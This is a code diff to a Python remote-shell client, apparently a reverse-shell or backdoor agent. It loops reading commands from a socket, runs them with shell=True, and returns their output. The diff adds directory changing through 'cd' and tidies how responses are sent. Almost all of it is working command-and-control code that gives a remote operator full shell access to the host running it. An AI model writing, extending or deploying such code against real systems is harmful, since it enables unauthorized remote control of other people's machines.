@@ -32,8 +32,16 @@ while True:
     command = command_data.decode()
     print(f"Command : ", command)
 
+    command_split = command.split(" ")
+
     if command == "infos":
         response = platform.platform() + " " + os.getcwd()
+    elif len(command_split) == 2 and command_split[0] == "cd":
+        try:
+            os.chdir(command_split[1].strip("'"))
+            response = " "
+        except FileNotFoundError:
+            response = "Error: No such file or directory"
     else:
         result = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)
         response = result.stdout + result.stderr
@@ -46,11 +54,12 @@ while True:
 
     # HEADER 0000003173
     # DATA 3173 octets
-
+    data_len = len(response.encode())
     header = str(len(response.encode())).zfill(13)
     print(f"Header {header}")
     s.sendall(header.encode())
-    s.sendall(response.encode())
+    if data_len > 0:
+        s.sendall(response.encode())
 
     # Hanshake
 
